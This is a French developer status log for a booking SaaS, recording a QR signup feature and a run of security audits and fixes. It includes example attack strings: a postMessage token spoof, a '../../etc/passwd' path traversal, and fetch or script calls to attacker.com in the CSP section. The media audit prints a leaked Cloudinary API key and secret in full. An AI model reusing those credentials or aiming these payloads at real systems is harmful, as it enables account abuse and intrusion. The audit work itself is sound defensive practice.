# FlowIA — STATUS (2026-04-20)

Dernier commit : voir `git log -1`. Historique complet des sessions précédentes
dans `git log` (le fichier a été réinitialisé).

---

## 🆕 Session 2026-04-20 (suite 29) : Feature QR + Audit FRONT — commit R

**Fichiers** : `backend/src/routes/public-booking.js`, `frontend/src/utils/api.js`,
`frontend/src/index.jsx`, `frontend/src/pages/BookingPage.jsx`,
`frontend/src/pages/booking/Account.jsx`, `frontend/src/pages/booking/ReferralPage.jsx`,
`frontend/src/components/AuthFlow.jsx`, `frontend/src/pages/Agenda.jsx`,
`frontend/src/pages/EmployeeAgenda.jsx`, `frontend/src/pages/settings/TabMarketing.jsx`.

### ✨ Feature : inscription rapide via QR code

**Flux** : commerçant affiche QR → client scan `https://domaine/j/<slug>` →
redirect `/book/<slug>/auth?quick=1` → formulaire ultra-court (prénom + nom
optionnel + téléphone) → fiche créée en ~10 s → commerçant voit le client
dans `ClientsPage` et peut encaisser.

**Backend** — nouvelle route `POST /api/pub/:slug/client/quick-register` :
- Valide `first_name` (requis, ≤100) + `phone` (requis, 6-20 chiffres).
- **Idempotence** : recherche sur `regexp_replace(phone, '\\D', '')` — re-scan
  par le même numéro renvoie la fiche existante + nouveau JWT 30j, pas de
  doublon.
- Email synthétique `qr-<phoneDigits>-<rand>@qr.flowia.local` +
  bcrypt random (inutilisable au login classique) pour respecter le schéma
  `client_accounts` (email NOT NULL UNIQUE).
- `source='qr'` dans la ligne créée → suivi des inscriptions QR côté stats.
- `error hygiene` : 400 génériques, 500 `'Erreur serveur.'` + log serveur
  (aligné audits K→Q).

**Frontend** :
- `/j/:slug` → composant `QuickJoinRedirect` qui `Navigate` vers
  `/book/<slug>/auth?quick=1` (URL courte = QR plus dense/fiable).
- `BookingPage` lit `?quick=1` au mount → `quickMode=true` → passé à
  `AuthPanel`.
- `AuthPanel` rend un formulaire minimal (prénom + tél, nom opt.) quand
  `mode==='quick'`. Lien "Déjà un compte ? Se connecter" pour basculer.
- Après succès : `?quick=1` nettoyé via `navigate` replace, le client
  arrive sur l'accueil marchand identifié.

### 🔒 Audit sécurité FRONTEND — commit R

Audit complet de `Settings.jsx`+`settings/*` (~7800 lignes),
`BookingPage.jsx`+`booking/*` (~4700 lignes), `Dashboard.jsx` + pages
marchand. 3 findings CRITIQUES corrigés :

- **`postMessage` origin check (CRITIQUE)** : les handlers Google OAuth
  dans `Account.jsx:69-79`, `ReferralPage.jsx:302-312`, `AuthFlow.jsx:220`
  et l'inline `BookingPage.jsx:1893` écoutaient `window.on('message', …)`
  sans vérifier `e.origin`. Une page tierce ouverte dans un onglet à côté
  pouvait `postMessage({type:'GOOGLE_AUTH_SUCCESS', token:'…'})` et se
  faire stocker un faux `ff_client_token` / `ff_token` marchand. Fix :
  `if (e.origin !== window.location.origin) return;` avant tout traitement.

- **Error hygiene `alert(e.message)` sans fallback** : `Agenda.jsx` (5×),
  `EmployeeAgenda.jsx` (4×), `TabMarketing.jsx:1712`. Sur erreur réseau
  ou parse JSON, le message brut s'affichait. Fix : fallback
  `e.message || 'Une erreur est survenue.'`. Aligné avec backend K→Q qui
  renvoie toujours `'Erreur serveur.'` en 500.

- **`setErr(e.message)` sans fallback** dans `Account.jsx:109`,
  `AuthFlow.jsx:627`, `Account.jsx:811/822` (login/register global). Fix :
  messages génériques `'Échec de la connexion.'` / `'Inscription
  impossible. Réessayez.'`.

- **`doCancel` sans `window.confirm`** dans `EmployeeAgenda.jsx:213`
  (audit report C3). `Agenda.jsx:188` avait déjà `confirm(...)`, le flow
  employé non. Fix : modal native de confirmation avant l'annulation.

- **Validation inputs publics** (audit HAUT) :
  - `BookingPage.jsx:1794` téléphone — ajout `inputMode="tel"`,
    `maxLength={20}`, `pattern="[0-9+\\s\\-]*"`.
  - `BookingPage.jsx:1806` textarea notes — `maxLength={500}` + slice
    côté onChange (double garde anti-DOS / payload abusif).
  - `BookingPage.jsx:45` query param `?ref=CODE` — regex
    `/^[A-Z0-9]{4,30}$/` appliquée avant écriture `localStorage` (et
    relecture). Avant, n'importe quel overflow passait.

### Non modifié (faible impact)

- **`console.error(e)` en clair** (audit report finding HAUT) — `vite.config.js`
  a `drop_console:true`, Terser supprime **tous** les `console.*` en
  production. Dev-only concern, non traité.

- **Tokens clients en `localStorage`** — audit report CRITIQUE #3. Fix
  propre = cookie HttpOnly côté backend (change majeur). À planifier en
  session dédiée.

- **PII en URL** (`/client/passages/:visitId`) — backend déjà isolé par
  token, risque réel faible. Non critique.

- **Suppression compte via string "SUPPRIMER"** — faible, demande OTP
  email/SMS, feature à part.

### Build

- `cd frontend && npm run build` → ✓ 87 modules transformed en 13.92 s, pas
  de warning.
- Backend syntax check `node -c public-booking.js` → OK.

### Commit
- `a75fe5b` feat(qr) + audit(front) R: quick signup /j/:slug + postMessage origin + error hygiene + input validation
- `565141d` docs: STATUS session 29 commit R avec SHA
- `5d2cf39` hardening(qr) R1: rate-limit dédié /client/quick-register (30/15min/IP) + rejet téléphones fake (chiffres identiques / séquences 0-9)
- `2f80d47` feat(qr) S: UI QR dans Settings/Clients — canvas + download PNG 512px + copy lien (lib `qrcode`)
- `151877d` audit(payments) T: amount cross-check Stripe vs metadata + handler refund/dispute + error hygiene
- `110dc79` audit(global-clients) U: OTP crypto.randomInt + rate limiters dédiés + error hygiene
- `80630d4` audit(transactions) V: IDOR appointment scope + whitelists type/method + bounds amount/desc/note + date validation + error hygiene
- `0379c64` audit(referrals) W: normalisation anti-self-referral + PIN admin config + caps metier + error hygiene
- `111da9d` audit(loyalty) X: PIN admin config/delete + caps metier + cap stamps_to_add + normalisation email
- `f599a2d` security(headers) Y: CSP + HSTS + Referrer-Policy + Permissions-Policy (frontend Vercel + backend middleware)

### 🔒 Security headers — commit Y

**Fichiers** : `frontend/vercel.json` (headers HTML côté Vercel),
`backend/src/index.js` (middleware API côté Render).

**Protections ajoutées** :

- **Content-Security-Policy (CSP)** côté frontend (vercel.json) :
  - `frame-ancestors 'none'` → anti-clickjacking strict (plus fort que
    `X-Frame-Options`, couvre le cas où un futur dev retire ce header).
  - `base-uri 'self'` → bloque `<base>` injection (technique XSS rare
    mais effective).
  - `object-src 'none'` → bloque Flash/plugins (vecteur XSS legacy).
  - `form-action 'self'` → un formulaire ne peut submit que vers le
    même domaine.
  - `script-src` : whitelist `cdn.tailwindcss.com`, `js.stripe.com`,
    `accounts.google.com`. `'unsafe-inline'` + `'unsafe-eval'` requis
    par Tailwind CDN runtime et inline config dans `index.html` — à
    durcir si on passe Tailwind en build-time.
  - `connect-src 'self' https: wss:` : permet API Render + WebSocket
    éventuel. Restreint à HTTPS (bloque `http://attacker.com`).
  - `upgrade-insecure-requests` : force HTTPS sur toutes les
    sous-requêtes.

- **Strict-Transport-Security (HSTS)** : `max-age=31536000;
  includeSubDomains` — force HTTPS sur le domaine + sous-domaines
  pendant 1 an. Protège contre downgrade man-in-the-middle.

- **Referrer-Policy** : `strict-origin-when-cross-origin` — ne leak pas
  l'URL complète (path + query) aux services tiers quand l'utilisateur
  clique sur un lien externe ou charge une image distante.

- **Permissions-Policy** : `geolocation=(), microphone=(), camera=(),
  usb=(), autoplay=(), payment=(self "https://js.stripe.com")` — coupe
  tous les accès API sensibles par défaut. Seul Stripe peut invoquer
  l'API Payment Request.

- **X-Content-Type-Options: nosniff** (déjà présent, conservé).

- **X-Frame-Options: DENY** (déjà présent, redondant avec
  `frame-ancestors 'none'` mais utile pour les vieux navigateurs).

- **Backend middleware** : mêmes headers transverses (nosniff, DENY,
  HSTS, Referrer, Permissions) sur chaque réponse API — protection
  même si quelqu'un hit directement `api.flowia.../` dans le navigateur
  (pages d'erreur HTML type 404 Express par défaut).

### Impact sécu

Si un jour un `dangerouslySetInnerHTML` ou une faille XSS est introduite
(audit R a confirmé qu'il n'y en a pas actuellement), la CSP limite
fortement ce que l'attaquant peut faire :
- impossible d'injecter `<script src="https://attacker.com/x.js">`
- impossible de `fetch('https://attacker.com/exfil', ...)`
- impossible de créer des iframes cachées
- impossible d'installer un `<base href="...">` pour détourner les URLs
  relatives

### Non corrigé / tradeoffs assumés

- **`'unsafe-inline'` + `'unsafe-eval'`** obligatoires pour Tailwind CDN
  runtime + inline config dans `index.html`. Durcir = passer Tailwind en
  build-time (refactor). Noté pour plus tard.
- **Nonce CSP** non implémenté (nécessiterait SSR ou post-processing du
  build Vite). `'unsafe-inline'` compense pragmatiquement.
- **Report-URI** non configuré — on pourrait ajouter un
  `report-to` pour recevoir les violations en prod, mais nécessite
  endpoint dédié.

### 🔒 Audit loyalty.js — commit X (dernier P1)

**Fichier** : `backend/src/routes/loyalty.js` (246 lignes). Système de
tampons/points fidélité. Aligné O/V/W.

**Vulnérabilités corrigées** :

- **PUT /program sans PIN admin** (HAUT) : modifier
  `stamps_required`/`reward_value`/`points_per_euro` = impact financier
  direct. Un JWT compromis (XSS) pouvait pousser `points_per_euro=9999`
  → toute transaction crédite des points massifs. Fix :
  `pinAdminMiddleware` (aligné O commissions / W referrals).

- **DELETE /clients/:id sans PIN admin** (HAUT) : un employé
  frauduleux avec JWT merchant peut effacer la ligne loyalty d'un
  client pour dissimuler un vol de tampons. Fix :
  `pinAdminMiddleware`.

- **Caps métier PUT /program** : avant, aucune borne supérieure —
  `reward_value=999` en percent, `points_per_euro=1000`,
  `stamps_required=999999` passaient tous. Fix : plafonds explicites
  `MAX_REWARD_PCT=100`, `MAX_REWARD_FIXED=500€`, `MAX_POINTS_PER_EU=100`,
  `MAX_STAMPS_REQ=100`, `MAX_MIN_PURCHASE=10 000€`,
  `MAX_VALIDITY_DAYS=3650`.

- **Cap `stamps_to_add`** sur POST `/stamp` et `/add-service` : avant,
  un appel pouvait ajouter 10 000 tampons d'un coup. Un marchand
  frauduleux pouvait déclencher récompense sans passages réels. Fix :
  `MAX_STAMPS_PER_OP=20` par appel.

- **Normalisation email** (aligné transactions V) : `client_email` envoyé
  en raw était passé tel quel à `incrementStamps` → `John@X.com` et
  `john@x.com` créaient 2 lignes `client_loyalty` distinctes. Fix :
  `trim().toLowerCase()` avant tout lookup/insert (POST /stamp +
  /add-service).

- **`Number.isFinite`** remplace `!isNaN` sur `reward_value` + validation
  `< 0` explicite.

- **Borne `reward_label ≤ 200`** : anti-DB-bloat (aligné V).

### Non modifié (déjà sain)

- **Scope `user_id`** systématique sur 100% des queries. OK.
- **Whitelists** `reward_type`, `count_trigger`, `loyalty_mode`. OK.
- **Error hygiene** déjà aligné `'Erreur serveur.'` (merci audit plus tôt).
- **POST /stamp et /add-service sans PIN admin** : appels caisse
  quotidiens, PIN casserait l'UX. Le cap `MAX_STAMPS_PER_OP=20` limite
  l'abus.

## 📊 Récap audit P1 backend (commits T, U, V, W, X)

5 routes critiques auditées et hardénisées :
- **T** : `payments.js` — Stripe refund/dispute handler + amount cross-check
- **U** : `global-clients.js` — OTP crypto + rate limiters dédiés
- **V** : `transactions.js` — IDOR appointment + whitelists + bounds
- **W** : `referrals.js` — anti-self-referral Gmail alias + PIN config
- **X** : `loyalty.js` — PIN config/delete + caps + normalisation email

Toutes les routes backend critiques de FlowIA sont désormais auditées.
P2 restant (cosmétique/compliance) : CSP headers, RGPD opt-out.

### 🔒 Audit referrals.js (parrainage) — commit W

**Fichier** : `backend/src/routes/referrals.js` (552 lignes). Système de
parrainage — un bug = fraude directe (parrain = filleul → double
récompense). Aligné audits K/O.

**Vulnérabilités corrigées** :

- **Self-referral via Gmail alias** (CRITIQUE). Avant, la comparaison
  `owner_client_email.toLowerCase() === filEmail` (L459) laissait passer
  `parrain@gmail.com` vs `parrain+x@gmail.com` (Gmail ignore `+alias`)
  ou `parrain @gmail.com` (espace). Un client pouvait se parrainer
  lui-même et empocher 2 remises. Fix : helper
  `normalizeEmailForCompare()` qui trim+lowercase+strip whitespace+ôte
  `+suffix` avant comparaison.

- **PUT /program sans PIN admin** (HAUT, aligné O). Un JWT marchand
  compromis via XSS / session hijack pouvait pousser `filleul_value=90%`
  et vider la marge marketing. Fix : `pinAdminMiddleware` ajouté sur
  PUT `/program` (cohérent avec `commissions`, `credits`, `rh/paie`).

- **Caps métier sur récompenses** (HAUT) : avant, `parrain_value=999` en
  percent passait (parrain reçoit 999% du prix). Fix : percent ≤ 100,
  fixed ≤ 500 €, `limit_count` ≤ 10 000. Protège contre typos admin et
  escalade de privilèges si le JWT est compromis.

- **Validation `Number.isFinite`** remplace `!isNaN` sur `pv`/`fv` —
  stricte, refuse `Infinity`, `null→0` implicites (aligné audit O sur
  commissions).

- **Error hygiene** : L374 `res.status(500).json({ valid: false, error:
  e.message })` → `'Erreur serveur.'` (aligné K→V). Les autres `e.message`
  (L386-388) sont des erreurs contrôlées throw par `validateReferralUse`
  (codes métier `NOT_FOUND`, `ALREADY_HANDLED`) — conservés.

### Non corrigé / analysé

- **UNIQUE constraint sur `referral_uses(user_id, filleul_email, status)`** :
  protection applicative existe déjà (L482-488 SELECT + check). Race
  théorique sous forte concurrence → fix propre = migration DB avec
  partial index. Hors scope chirurgical.

- **Rate limit dédié sur `/check`** : route marchand derrière
  `authMiddleware` + `apiLimiter` 300/min. Suffisant car il faut un JWT
  valide pour appeler — pas d'accès public.

- **Race validation double** (L381-392) : `validateReferralUse` utilise
  `FOR UPDATE` et transition stricte `pending → validated`, retourne
  erreur `ALREADY_HANDLED` si déjà traité. Idempotent correct.

- **IDOR `/uses/:id/validate` et `/uses/:id/cancel`** : déjà protégés
  par filtre `user_id=$2` dans le UPDATE. OK.

- **Soft-delete codes** : feature produit non critique.

### 🔒 Audit transactions.js — commit V

**Fichier** : `backend/src/routes/transactions.js` (786 lignes). Cœur
métier — tout encaissement passe ici. Aligné avec audits O/P/Q/U
(whitelists, bounds, error hygiene).

**Vulnérabilités corrigées** :

- **IDOR cross-tenant via `appointment_id`** (CRITIQUE). Ligne 447
  (devenue 450) : `SELECT client_email, client_name FROM appointments
  WHERE id=$1` sans filtre `user_id`. Un marchand pouvait POST une
  transaction avec l'`appointment_id` d'un autre marchand → fuite du
  `client_email` + `client_name` dans sa propre table loyalty. Fix :
  `AND user_id=$2` + paramètre `req.user.userId`.

- **Whitelists `type` et `payment_method`** (HAUT). Avant,
  `type='foobar'` / `payment_method='bitcoin'` passaient silencieusement
  → stats/recaps cassés en GROUP BY. Fix : `VALID_TX_TYPES`
  (`revenue|expense|refund|adjustment`) + `VALID_TX_METHODS`
  (`cash|card|transfer|check|multi|other`), rejet 400 sinon.
  Appliqué POST + PUT.

- **Cap amount** (HAUT) : `MAX_AMOUNT=999 999.99` (NUMERIC(10,2) safe).
  Avant, une typo `100` → `100 000 000` passait → compta corrompue.
  Appliqué POST + PUT.

- **Bornes texte** (HAUT, anti-DB-bloat) : `description ≤ 500`,
  `client_note ≤ 2000`. Sans ces bornes, un marchand malveillant pouvait
  POST 1M tx avec note 100 KB → saturation DB.

- **Date format** (MOYEN) : `"2026-13-40"` remontait jusqu'à PG avec
  erreur cryptique. Fix : `isRealDate()` + regex `YYYY-MM-DD` +
  round-trip ISO. Appliqué POST + PUT (aligné audit O absences).

- **Error hygiene** (5 occurrences) : `res.status(500).json({ error:
  e.message })` → `'Erreur serveur.'` (aligné K→U). Logs serveur
  conservés.

### Non corrigé / faux positifs

- **POST sans PIN admin** (agent flaggait CRITIQUE) : faux positif. Les
  encaissements caisse sont voulus sans PIN à chaque tx (UX). Les
  mutations sensibles (PUT, DELETE) exigent déjà `pinAdminMiddleware`.
  `employee_id` est anti-spoofé via `req.employee.id` si PIN employé
  présent (commit C).

- **Race double-encaissement sur même `appointment_id`** : protégé par
  `idempotency_key` UNIQUE sur `(user_id, idempotency_key)`. Le cas
  "2 clients différents encaissent le même RDV" est théorique (nécessite
  accès concurrent sans idem key côté front) — non adressé ici pour
  rester chirurgical.

- **PUT loyalty resync hors transaction** : refactor non trivial
  (resync fait des appels async séparés sur `client_loyalty` et
  `passages`). Pas de bug observable en prod, skip chirurgical.

- **Sort injection** (L120 `ORDER BY t.date DESC` hardcodé) : safe tant
  que pas de `sort_by` query. Noté pour futur dev.

### 🔒 Audit global-clients.js (cross-tenant) — commit U

**Fichier** : `backend/src/routes/global-clients.js` (1273 lignes). Compte
PLATEFORME cross-marchand — un client peut être inscrit chez plusieurs
salons via le même compte. Une faille = fuite de données entre salons OU
takeover via OTP faible.

**Vulnérabilités corrigées** :

- **OTP cryptographiquement faible** (CRITIQUE) : 3 codes générés via
  `Math.floor(100000 + Math.random() * 900000)` — `Math.random()` est
  déterministe, un attaquant qui observe quelques codes peut prédire les
  suivants. Fix : `crypto.randomInt(100000, 1000000)` (PRNG cryptographique).
  Appliqué lignes 814 (change-email), 903 (change-password), 1030
  (forgot-password).

- **Rate limiting trop laxe** (CRITIQUE) : les endpoints sensibles
  (`/register`, `/login`, `/forgot-password`, `/reset-password`,
  `/me/change-email`, `/me/change-password`) étaient sous `apiLimiter`
  (300 req/min) — ce qui permettait 300 essais d'OTP 6-chiffres par
  minute = bruteforce complet en 1h. Fix : appliqué dans `index.js`
  `registerLimiter` (5 req/10min) sur tous ces endpoints. Bruteforce =
  10^6 / (5/10min) = 3 ans.

- **Error hygiene** (18 occurrences alignées K→T) : `res.status(500)
  .json({ error: e.message })` fuitait SQL/stack/bcrypt errors.
  Remplacé par `'Erreur serveur.'` + log serveur conservé pour debug.

### Non corrigé (non-bugs ou hors scope)

- **/appointments filtré par email** (L544-564) : l'agent d'audit a
  signalé un IDOR potentiel. FAUX POSITIF : l'email est extrait de
  `SELECT email FROM global_clients WHERE id=$1` (L547) — autorité est
  le `globalClientId` du JWT, pas un param user. OK.

- **Race /me/change-email/confirm** (L848-865) : re-check puis UPDATE.
  Protégé par la contrainte UNIQUE email en DB + catch explicite `23505`
  ligne 863 qui renvoie 409. La race est correctement gérée.

- **JWT 30j sans blacklist** : réduire à 7j déconnecterait tous les
  utilisateurs actifs (breaking UX). Implémenter blacklist JTI =
  nouvelle table + Redis-like — refactor propre, pas chirurgical.

- **Password 6 chars min** : faible mais policy UX assumée.

- **Code OTP en clair en DB** : `verification_codes.code` non hashé. TTL
  15 min + rate limit strict R (3 tentatives / 10 min) rend le risque
  acceptable. À hasher (HMAC) si audit compliance futur.

- **Fusion automatique email/phone au /register** : feature produit
  assumée (un client peut se rattacher à sa fiche locale existante).
  Nécessite un flow OTP d'attestation email avant fusion pour durcir —
  gros refactor, hors scope.

### 🔒 Audit payments.js (Stripe) — commit T

**Fichier** : `backend/src/routes/payments.js` (467 lignes). Critique financier —
une faille = perte d'argent directe ou crédit gratuit.

**Vulnérabilités corrigées** :

- **Handlers refund/dispute absents** (CRITIQUE, vraie faille). Avant : un
  attaquant paye 500 €, obtient 500 € SMS, dispute la CB → Stripe rétrocède
  l'argent mais solde SMS conservé = recharge gratuite. Fix : nouveaux
  handlers `charge.refunded` + `charge.dispute.closed` qui insèrent une
  `sms_transactions` type='refund' (idempotent via UNIQUE
  `sumup_checkout_id`=charge.id) puis `UPDATE users SET sms_balance =
  GREATEST(0, sms_balance - refund)` (jamais négatif).

- **Amount tampering defense-in-depth** (HAUT). L'amount crédité venait de
  `session.metadata.amount` / `intent.metadata.amount` sans cross-check
  contre l'amount Stripe officiel (`amount_total`, `amount_received`). Un
  bug futur ou une manipulation metadata créditait n'importe quoi. Fix :
  validation `Math.abs(metaAmount - stripeAmount) < 0.01` avant crédit
  dans les 3 chemins (webhook session, webhook intent, verify-intent,
  verify-session). Source of truth = Stripe.

- **Error hygiene** (aligné K→R) : `res.status(500).json({ error: e.message })`
  et `'Erreur paiement: ' + e.message` fuitaient détails Stripe / SQL.
  Fix : `'Erreur serveur.'` générique sur 10 handlers 500, log serveur
  conservé pour debug. Sur 400 StripeCardError : whitelist de messages
  utilisateurs (`'Carte refusée.'`, `'Fonds insuffisants.'` etc.) au lieu
  de `e.message` brut.

### Non modifié (protections existantes suffisantes)

- **Webhook signature** : `stripe.webhooks.constructEvent` appliqué
  correctement, `express.raw` registered AVANT `express.json` dans
  `index.js:107`. OK.
- **Idempotence crédit** : `creditSmsOnce` via UPDATE atomique
  (`status='pending' → 'completed'`) + UNIQUE index
  `uq_sms_tx_checkout`. OK.
- **Auth création intent** : `authMiddleware` sur `/intent` + `/checkout`,
  `userId` extrait du JWT (pas du body). OK.
- **Rate limit** : `paymentsIntentLimiter` 15/15min sur intent+checkout
  (pas sur webhook — volontaire, Stripe retry). OK.
- **Currency** : hardcodée `'eur'` côté serveur, aucune lecture du body.
  OK.
- **Bounds amount** : 5-1000 EUR enforced (L98-99, L274-278). OK.
- **Logs avec montants/userId** : conservés (debug oncall légitime, pas
  un secret). Non fixé.

---

## Session 2026-04-20 (suite 28) : Audit MEDIA/Upload — commit Q

**Fichier** : `backend/src/routes/media.js`

### 🚨 FUITE DE SECRETS DÉTECTÉE (CRITIQUE)

Les **clés Cloudinary étaient hardcodées** comme fallback dans le source
(lignes 184-186 avant audit) :
```js
cloud_name: process.env.CLOUDINARY_CLOUD_NAME || 'daovpx82c',
api_key:    process.env.CLOUDINARY_API_KEY    || '656558537324395',
api_secret: process.env.CLOUDINARY_API_SECRET || 'UpTgNOyLYKXPD3vWQ0VncEHEkOQ',
```

**Ces credentials sont dans l'historique git public** → compromis
définitivement.

**🔴 ACTION MANUELLE OBLIGATOIRE** :
1. Aller dans Cloudinary → Console → Settings → Access Keys
2. **Révoquer `656558537324395`** (le api_secret `UpTgNOy…EkOQ` permettait
   upload/delete sur le compte).
3. Générer une nouvelle paire api_key/api_secret.
4. Mettre à jour les env vars `CLOUDINARY_API_KEY` / `CLOUDINARY_API_SECRET`
   sur Render + local `.env`.
5. Redéployer — le code actuel fail-fast si les env vars manquent.

### Vulnérabilités corrigées

- **Secrets hardcodés** : fallbacks retirés, `throw new Error` au boot si
  env vars manquent (fail-fast).

- **MIME whitelist stricte** : avant `file.mimetype.startsWith('image/')`
  laissait passer `image/svg+xml` (→ XSS si servi inline), `image/heic`
  (casse les libs client), etc. Fix : whitelist `jpeg|png|webp|gif`.

- **Validation magic bytes** : avant, le MIME déclaré par le client
  suffisait (falsifiable trivialement). Un `.exe` renommé `.jpg` avec
  `Content-Type: image/jpeg` passait. Fix : fonction
  `isValidImageBuffer()` qui lit les premiers octets et vérifie les
  signatures JPEG (FF D8 FF), PNG (89 50 4E 47 …), GIF (47 49 46 38),
  WebP (RIFF…WEBP). Rejet 400 si mismatch.

- **Path traversal local storage** : `fetchImageBuffer` pour
  `provider='local'` faisait `path.join(uploads, pathDB)`. Un path DB
  malicieux (via un autre endpoint compromis ou injection future)
  `../../etc/passwd` résolvait hors de `uploads/` → lecture arbitraire
  de fichiers serveur. Fix : `path.resolve` + vérif
  `fPath.startsWith(root + sep)`.

- **Extension whitelist + normalisation** : `filename` multer diskStorage
  préservait l'extension originale → `attack.php.jpg` stocké tel quel.
  Fix : whitelist `.jpg/.jpeg/.png/.webp/.gif`, normalisation vers
  `.jpg` si extension non whitelistée.

- **`files: 1`** ajouté dans multer limits (avant, pas de cap sur le
  nombre de champs par requête).

- **Error hygiene** : `e.message` fuitait les détails Cloudinary / S3 /
  fs (ex: "403 Forbidden", "AccessDenied", paths serveur). Fix : GET
  routes → `'Image introuvable'`, POST/DELETE → `'Erreur serveur.'` +
  log serveur. 14 handlers corrigés.

### Non corrigé (hors scope)
- **Rate limit GET public** : `/commercant/:userId/profile` etc.
  exposés sans rate limit spécifique (seul le global Express s'applique).
  DDoS vers Cloudinary = coût $$. À renforcer middleware.
- **Validation dimensions image** : un 5 MB 20000×20000 px peut exploser
  la mémoire côté client lors du resize. Nécessite lib `sharp` (non
  installée) — skip.
- **Vérification contenu SVG/polyglot** : whitelist MIME + magic bytes
  couvre déjà les cas classiques. Un vrai polyglot JPEG/HTML reste
  théoriquement servable mais le `Content-Type: image/jpeg` du serveur
  empêche l'exécution dans le navigateur.

### Commit
- `0196e67` audit(media) Q: remove hardcoded Cloudinary secrets + MIME/magic-byte whitelist + path traversal

---

## Session 2026-04-20 (suite 27) : Audit CAMPAGNES/MARKETING — commit P

**Fichiers** : `campaigns.js`, `marketing.js`

### Vulnérabilités corrigées

- **`marketing.js /plan/launch` — bypass validation promo** :
  `parseInt(discounts[seg]) || default_discount` INSÉRAIT direct dans
  `promo_codes` avec `value=pct` sans contrôle max. `discounts.at_risk=10000`
  passait → contourne la validation audit K (`promo.js` percent ≤ 100).
  Fix : validation stricte `Number.isFinite(pct) && 0<pct<=100`, fallback
  au défaut sinon.

- **`marketing.js /plan/launch` — débit sans garde anti-overdraft** : le
  `UPDATE sms_balance = sms_balance - $1` n'avait pas de clause
  `WHERE sms_balance >= $1` → solde négatif possible si envoi concurrent.
  Incohérent avec `campaigns.js` (audit R1). Fix : garde + log si échec
  (SMS déjà partis, pas réversibles).

- **`marketing.js /plan/launch` — anti-spam 7j absent** : `campaigns.js`
  `getClientSegmentsWithHabits` excluait les clients ayant reçu un SMS
  dans les 7 derniers jours. `/plan/launch` ne le faisait pas → 2 plans
  lancés en chaîne envoyaient 2 SMS au même client le même jour. Fix :
  `NOT EXISTS` sur `message_log` dans la SELECT de `/plan/launch`.

- **`campaigns.js /send` — validation inputs absente** : `channel`,
  `target_type`, `message_sms`, `message_email` acceptaient n'importe
  quoi. `channel='xyz'` créait une campagne sans envoi (piège comptable),
  `message_sms` vide ou 5000 chars passait (spam/coût). Fix :
  whitelist `VALID_CHANNELS` / `VALID_TARGET_TYPES`, `MAX_SMS_LEN=480`
  (3 SMS concaténés), `MAX_EMAIL_LEN=10000`.

- **`campaigns.js /auto-send` — budget/duration non validés** :
  `/auto-plan` validait `budget < 1`/`duration 3-30` mais `/auto-send`
  ne validait RIEN en entrée (délégait à `generateCampaignPlan` qui
  cappait `durationDays` mais pas `budget`). Un appel direct avec
  `budget:-1000` ou `budget:9999999` passait jusqu'au check
  `balance_sufficient`. Fix : mêmes gardes qu'`/auto-plan` + borne
  `budget ≤ 10000€` + validation `discounts.{risque,perdu,fidele}`
  entre 5-50%.

- **Error hygiene** : `e.message` → `'Erreur serveur.'` sur 6 handlers
  (4 campaigns + 2 marketing). Aligné K/L/M/N/O.

### Non corrigé (dette structurelle)
- **RGPD opt-out absent** : aucune colonne `unsubscribed`/`marketing_opt_in`
  dans `client_accounts` / `global_clients`. Les SMS/emails marketing
  partent à tous les clients ayant téléphone/email, sans consentement
  marketing explicite (le consentement BOOKING ≠ consentement MARKETING).
  Nécessite migration DB + UI d'opt-in + lien de désabonnement dans
  chaque SMS/email. À planifier en session dédiée.
- **Rate limit niveau route** (`/send`, `/auto-send`, `/plan/launch`) :
  couvert au middleware Express (`index.js`). Pas modifié ici.
- **Advisory lock sur `/send`** : `/auto-send` l'a (R9). `/send` non —
  double-clic peut créer 2 campagnes. Impact limité (le preview côté
  client doit déjà gérer), non modifié pour rester chirurgical.

### Commit
- `f37aa13` audit(campaigns/marketing) P: validation inputs + anti-overdraft + anti-spam 7j

---

## Session 2026-04-20 (suite 26) : Audit RH/PAIE — commit O

**Fichiers** : `employees.js`, `employee-pins.js`, `commissions.js`, `absences.js`

### Vulnérabilités corrigées

- **`employees.js` — bypass PIN admin sur smart-delete** : `DELETE /:id`
  exigeait `pinAdminMiddleware` (audit perms #3) mais `POST /:id/smart-delete`
  qui supprime AUSSI l'employé (ligne 204) + annule/réaffecte tous les RDV
  futurs était accessible avec seulement le JWT merchant → contournement
  trivial de la protection RH. Fix : `pinAdminMiddleware` ajouté.

- **`commissions.js` — bypass PIN admin sur `PUT /settings/:employeeId`** :
  un utilisateur avec le seul JWT merchant (device partagé, XSS) pouvait
  pousser `commission_pct=100` sur n'importe quel employé → vol financier
  direct via la route `/api/commissions`. Incohérent avec `employees.js`
  qui exige le PIN admin sur tout UPDATE. Fix : `pinAdminMiddleware` +
  validation stricte `Number.isFinite(pct)` (avant, `"50"` ou `null` passait
  silencieusement).

- **`absences.js` — bug métier PUT type écrasé** : `type||'conges'` dans
  le UPDATE écrasait silencieusement un `maladie` ou `maternite` en
  `conges` si le client ne renvoyait pas le champ. Fix :
  `COALESCE($3, type)` préserve la valeur existante en BDD.

- **`absences.js` — format date non validé** : `"2026-13-40"` ou
  `"bad-string"` remontaient jusqu'à PG avec message d'erreur cryptique
  (fuite via `e.message`). Fix : helper `isValidDate()` + regex `YYYY-MM-DD`
  + round-trip ISO sur POST, PUT, GET /stats.

- **`employee-pins.js` — `/verify` sans regex 4 digits** : cohérence avec
  `/set`. Avant, un PIN `"abcd"` ou `"12345"` consommait une tentative
  bcrypt inutile (CPU + pouvait déclencher lockout sur inputs
  manifestement invalides).

- **Error hygiene** : `res.status(500).json({error: e.message})` →
  `'Erreur serveur.'` + log serveur sur 10 handlers (3 commissions + 6
  absences + 1 employees smart-delete). Aligné K/L/M/N.

### Non corrigé (hors scope)
- `employees.js` : `module.exports = router;` ligne 68 avec des
  `router.get/post` ajoutés APRÈS (lignes 71-217). Fonctionne car Node
  exporte par référence mais anti-pattern. Cosmétique, zéro impact runtime.
- `commissions.js GET /` : `new Date()` UTC pour fromD/toD par défaut.
  Même bug mineur que credits.js (audit L). Impact : transition minuit
  Paris/UTC mid-period. Non critique, à envisager en audit TZ global.
- `absences.js` : pas de `pinAdminMiddleware` sur CRUD absences — choix
  produit (saisie d'absence = opérationnel quotidien, pas RH critique).

### Commit
- `95c4e09` audit(rh/paie) O: pinAdmin gaps + type preservation + error hygiene

---

## Session 2026-04-20 (suite 25) : Audit AUTH — commit N (critique sécurité)

**Fichier** : `backend/src/routes/auth.js` (login / register / forgot-password
+ change-email + PIN + Google OAuth)

### Vulnérabilités corrigées

- **Énumération email `/login`** : retournait `'Email introuvable.'` (401) si
  le compte n'existait pas, `'Mot de passe incorrect.'` (401) sinon. En plus,
  la branche "email inconnu" court-circuitait `bcrypt.compare` → différence
